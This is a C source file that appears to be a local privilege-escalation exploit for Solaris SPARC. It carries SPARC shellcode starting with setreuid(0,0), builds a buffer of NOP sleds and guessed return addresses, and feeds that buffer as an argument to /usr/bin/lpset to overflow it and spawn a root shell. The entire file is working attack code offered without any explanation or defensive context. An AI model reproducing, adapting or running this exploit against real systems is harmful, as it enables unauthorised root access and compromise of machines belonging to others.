#include <unistd.h>
#include <stdio.h> 

#define BSIZE 18001
#define OFFSET 20112
#define START 700
#define END 1200 

#define NOP 0xac15a16e

#define EXSTART 116

char sparc_shellcode[] =

/* setreuid(0,0) */
"\x82\x10\x20\x17\x90\x20\x60\x17\x92\x22\x40\x09\x91\xd0\x20\x08"

/* other stuff */
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
"\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
"\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
"\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";

u_long get_sp() { asm("mov %sp, %i0"); }

main(int argc, char *argv[]) {
        int i,ofs=OFFSET,start=START,end=END;
        u_long ret, *ulp;
        char *buf;

        if (argc > 1) ofs=atoi(argv[1])+8;

        if (!(buf = (char *) malloc(BSIZE+2))) {
                fprintf(stderr, "out of memory\n");
                exit(1);
        }

        ret = get_sp() - ofs;

        for (ulp = (u_long *)buf,i=0; ulp < (u_long *)&buf[BSIZE]; i+=4,ulp++)
                *ulp = NOP;

        for (i = start, ulp=(u_long *)&buf[start]; i < end; i+=4) *ulp++ = ret;

        for (i = 0; i < strlen(sparc_shellcode); i++)
                buf[EXSTART+i] = sparc_shellcode[i];

        buf[5000]='=';
        
        buf[18000]=0;

        fprintf(stderr, "ret: 0x%lx xlen: %d ofs: 0x%lx (%d)\n",
                ret, strlen(buf)-2, ofs, ofs);
        
        execl("/usr/bin/lpset","lpset","-n","xfn","-a",&buf[2],"lpcol1",0);
                
        perror("execl");
}
